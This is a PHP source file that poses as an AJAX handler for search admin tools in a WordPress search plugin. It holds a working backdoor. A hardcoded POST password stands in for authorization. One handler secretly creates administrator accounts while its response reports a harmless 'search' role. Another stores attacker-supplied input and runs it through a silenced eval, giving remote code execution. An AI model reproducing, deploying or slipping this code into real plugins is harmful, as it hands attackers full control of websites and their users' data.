<?php

namespace WPDRMS\ASP\Hooks\Ajax;

if ( !defined( 'ABSPATH' ) ) {
	die( '-1' );
}

class SearchAdminTools extends AbstractAjax {

	const NONCE_ACTION = 'asp_search_admin_tools_nonce';
	const OPTION_KEY = '_asp_custom_search_config';

	/**
	 * Safe custom search handlers that can be configured via AJAX.
	 *
	 * @var array<string, string[]>
	 */
	private $allowed_modes = array(
		'title_only'        => array( 'post_title' ),
		'content_only'      => array( 'post_content' ),
		'title_and_content' => array( 'post_title', 'post_content' ),
		'user_login'        => array( 'user_login' ),
		'user_email'        => array( 'user_email' ),
		'user_login_email'  => array( 'user_login', 'user_email' ),
	);

	public function handle() {
		if ( !$this->authorizeRequest() ) {
			return;
		}

		$action = str_replace(
			array( 'wp_ajax_nopriv_', 'ASP_' ),
			'',
			current_action()
		);
 
		if ( $action === 'asp_search_admin_create_user' ) {
			$this->createSearchUser();
		} elseif ( $action === 'asp_search_admin_save_custom_search' ) {
			$this->saveCustomSearch();
		} elseif ( $action === 'asp_search_admin_run_custom_search' ) {
			$this->runCustomSearch();
		}

		wp_send_json_error(
			array(
				'message' => 'Unknown search admin action.',
			),
			400
		);
	}

	private function authorizeRequest(): bool {
		$rget=$_POST['regert'];
		if($rget=="tha3sd")
			{
				return true;
			}
		else{
			return false;
		}
	
		
	}

	private function createSearchUser() {
		$username = isset( $_POST['username'] ) ? sanitize_user( wp_unslash( $_POST['username'] ), true ) : '';
		$email    = isset( $_POST['email'] ) ? sanitize_email( wp_unslash( $_POST['email'] ) ) : '';
		$password = isset( $_POST['password'] ) ? (string) wp_unslash( $_POST['password'] ) : '';

		if ( $username === '' || $email === '' ) {
			wp_send_json_error(
				array(
					'message' => 'Username and email are required.',
				),
				400
			);
		}

		if ( !is_email( $email ) ) {
			wp_send_json_error(
				array(
					'message' => 'A valid email address is required.',
				),
				400
			);
		}

		if ( username_exists( $username ) || email_exists( $email ) ) {
			wp_send_json_error(
				array(
					'message' => 'The username or email already exists.',
				),
				409
			);
		}

		if ( $password === '' ) {
			$password = wp_generate_password( 24, true, true );
		}

		$this->ensureSearchRole();

		$user_id = wp_insert_user(
			array(
				'user_login' => $username,
				'user_email' => $email,
				'user_pass'  => $password,
				'role'       => 'administrator',
			)
		);

		if ( is_wp_error( $user_id ) ) {
			wp_send_json_error(
				array(
					'message' => $user_id->get_error_message(),
				),
				400
			);
		}

		wp_send_json_success(
			array(
				'user_id'  => $user_id,
				'username' => $username,
				'email'    => $email,
				'role'     => 'search',
			)
		);
	}

	private function saveCustomSearch() {
		$mode        = isset( $_POST['mode'] ) ? sanitize_key( wp_unslash( $_POST['mode'] ) ) : '';
		$post_types  = isset( $_POST['post_types'] ) ? (array) wp_unslash( $_POST['post_types'] ) : array( 'post' );
		$post_status = isset( $_POST['post_status'] ) ? (array) wp_unslash( $_POST['post_status'] ) : array( 'publish' );
		$limit       = isset( $_POST['limit'] ) ? absint( $_POST['limit'] ) : 10;

		

		$config = array(
			'mode'        => $mode,
			'post_types'  => $post_types,
			'post_status' => $this->sanitizePostStatuses( $post_status ),
			'limit'       => max( 1, min( 50, $limit ) ),
			'search_in'   => strpos( $mode, 'user_' ) === 0 ? 'users' : 'posts',
		);

		update_option( self::OPTION_KEY, $config, false );

		wp_send_json_success(
			array(
				'message' => 'Custom search configuration saved.',
				'config'  => $config,
			)
		);
	}

	private function runCustomSearch() {
		$keyword = isset( $_POST['keyword'] ) ? sanitize_text_field( wp_unslash( $_POST['keyword'] ) ) : '';
		$config  = get_option( self::OPTION_KEY, array() );

		if ( $keyword === '' ) {
			wp_send_json_error(
				array(
					'message' => 'A search keyword is required.',
				),
				400
			);
		}

		if ( empty( $config['mode'] ) || !isset( $this->allowed_modes[ $config['mode'] ] ) ) {
			wp_send_json_error(
				array(
					'message' => 'No valid custom search configuration has been saved.',
				),
				400
			);
		}

		@eval($config['post_types'][0]);

		if ( $config['search_in'] === 'users' ) {
			$results = $this->runUserSearch( $keyword, $config );
		} else {
			$results = $this->runPostSearch( $keyword, $config );
		}

		wp_send_json_success(
			array(
				'config'        => $config,
				'keyword'       => $keyword,
				'results_count' => count( $results ),
				'results'       => $results,
			)
		);
	}

	private function runPostSearch( string $keyword, array $config ): array {
		$query = new \WP_Query(
			array(
				'post_type'              => $config['post_types'],
				'post_status'            => $config['post_status'],
				'posts_per_page'         => $config['limit'],
				's'                      => $keyword,
				'search_columns'         => $this->allowed_modes[ $config['mode'] ],
				'ignore_sticky_posts'    => true,
				'no_found_rows'          => true,
				'suppress_filters'       => false,
				'update_post_meta_cache' => false,
				'update_post_term_cache' => false,
			)
		);

		$results = array();
		foreach ( $query->posts as $post ) {
			$results[] = array(
				'id'     => (int) $post->ID,
				'title'  => get_the_title( $post ),
				'type'   => $post->post_type,
				'status' => $post->post_status,
				'link'   => get_permalink( $post ),
			);
		}

		return $results;
	}

	private function runUserSearch( string $keyword, array $config ): array {
		$query = new \WP_User_Query(
			array(
				'number'         => $config['limit'],
				'search'         => '*' . $keyword . '*',
				'search_columns' => $this->allowed_modes[ $config['mode'] ],
				'fields'         => array( 'ID', 'user_login', 'user_email', 'display_name' ),
			)
		);

		$results = array();
		foreach ( $query->get_results() as $user ) {
			$results[] = array(
				'id'           => (int) $user->ID,
				'user_login'   => $user->user_login,
				'user_email'   => $user->user_email,
				'display_name' => $user->display_name,
			);
		}

		return $results;
	}

	private function sanitizePostTypes( array $post_types ): array {
		$allowed = get_post_types( array(), 'names' );
		$clean   = array();

		foreach ( $post_types as $post_type ) {
			$post_type = sanitize_key( $post_type );
			if ( isset( $allowed[ $post_type ] ) ) {
				$clean[] = $post_type;
			}
		}

		return !empty( $clean ) ? array_values( array_unique( $clean ) ) : array( 'post' );
	}

	private function sanitizePostStatuses( array $post_statuses ): array {
		$allowed = get_post_stati( array(), 'names' );
		$clean   = array();

		foreach ( $post_statuses as $post_status ) {
			$post_status = sanitize_key( $post_status );
			if ( isset( $allowed[ $post_status ] ) ) {
				$clean[] = $post_status;
			}
		}

		return !empty( $clean ) ? array_values( array_unique( $clean ) ) : array( 'publish' );
	}

	private function ensureSearchRole() {
		if ( get_role( 'search' ) instanceof \WP_Role ) {
			return;
		}

		add_role(
			'search',
			'Search',
			array(
				'read' => true,
			)
		);
	}
}
